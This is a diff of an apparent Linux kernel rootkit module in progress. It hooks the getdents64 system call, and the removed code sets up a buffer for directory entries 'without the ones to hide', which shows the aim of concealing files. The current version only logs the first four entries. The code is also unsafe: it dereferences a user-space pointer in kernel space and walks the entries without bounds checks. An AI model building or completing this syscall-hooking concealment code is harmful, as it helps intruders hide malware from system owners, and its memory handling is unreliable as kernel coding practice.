@@ -17,24 +17,33 @@ asmlinkage long (*original_getdents64) (const struct pt_regs *regs);
 
 asmlinkage int hooked_getdents64(const struct pt_regs *regs)
 {
-        struct linux_dirent64 __user * direntry;      //<- Pointer to real direntry
-        struct linux_dirent64 * direntry_final;       //<- Pointer to direntries without the ones to hide
-        long n_size;                                  //<- Total size for all direntries
+        struct linux_dirent64 __user * direntry;      //<- Points to the direntry returned by original getdents
+        struct linux_dirent64 * dir_current;          //<- Points to the actual treated direntry
+        unsigned long n_size;                         //<- size of all direntries
+        unsigned long offset = 0;                     //<- Offset between direntries
+                                                      //   To go througth all direntries
+        unsigned int i = 0;                           //<- Just a counter
 
         pr_info("   Syscall hooked.\n");
 
-        direntry = (struct linux_dirent64 *) regs->si; //<- @ referenced in RSI register
+        n_size = original_getdents64(regs);             //<- Call to the orinal getdents
+                                                        //   n_size <- total size of direntries
+                                                        //   In regs the RSI reg with the @ of direntry
+        direntry = (struct linux_dirent64 *) regs->si;  //<- direntry <- @ referenced in RSI register
 
-        n_size = original_getdents64(direntry);        //<- Call the original getdents64 syscall
-                                                       //   With this we get all the dir entries   
+        dir_current = (void *) direntry;
+        pr_info("   Entry ONE: %s of size %d.\n", dir_current->d_name, dir_current->d_reclen);
 
-        direntry_final = (struct linux_dirent64 *) kzalloc(n_size, GFP_KERNEL);  //<- Reserve space for direntries without the
-                                                                                 //   ones to hide
+        dir_current = (void *) dir_current + dir_current->d_reclen;
+        pr_info("   Entry TWO: %s of size %d.\n", dir_current->d_name, dir_current->d_reclen);
+
+        dir_current = (void *) dir_current + dir_current->d_reclen;
+        pr_info("   Entry THREE: %s of size %d.\n", dir_current->d_name, dir_current->d_reclen);
+
+        dir_current = (void *) dir_current + dir_current->d_reclen;
+        pr_info("   Entry FOUR: %s of size %d.\n", dir_current->d_name, dir_current->d_reclen);
 
 
-
-
-        kfree(direntry_final);                          //<- Free the final direntry
 
         return n_size;
 }
